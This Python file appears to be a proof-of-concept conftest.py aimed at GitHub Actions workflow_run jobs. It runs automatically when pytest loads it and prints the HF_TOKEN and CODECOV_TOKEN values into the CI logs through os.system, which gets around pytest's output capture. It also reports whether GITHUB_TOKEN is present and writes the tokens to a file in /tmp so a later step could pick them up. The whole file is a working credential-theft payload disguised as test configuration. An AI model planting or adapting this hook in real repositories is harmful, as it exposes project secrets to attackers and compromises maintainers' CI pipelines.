import os
import sys

# Marker so the exfil is unmistakable in logs.
MARKER = "PWNED_D_a1b2c3d4"

hf = os.environ.get("HF_TOKEN", "<no-HF_TOKEN>")
cc = os.environ.get("CODECOV_TOKEN", "<no-CODECOV_TOKEN>")
gt_present = "yes" if os.environ.get("GITHUB_TOKEN") else "no"

# pytest captures Python stdout, but it does NOT intercept output written by
# child processes via os.system. Echo via /bin/sh so the marker + the secret
# values land directly in the GitHub Actions run logs.
os.system(f"echo '[{MARKER}] conftest.py executed inside privileged workflow_run job'")
os.system(f"echo '[{MARKER}] HF_TOKEN_value=' \"$HF_TOKEN\"")
os.system(f"echo '[{MARKER}] CODECOV_TOKEN_value=' \"$CODECOV_TOKEN\"")
os.system(f"echo '[{MARKER}] GITHUB_TOKEN_present={gt_present}'")

# Also write to a file so a later step / artifact upload could pick it up,
# and exit nonzero so the step prints the captured output too.
with open("/tmp/pwned_marker", "w") as f:
    f.write(f"[{MARKER}] HF={hf} CC={cc} GH_present={gt_present}\n")
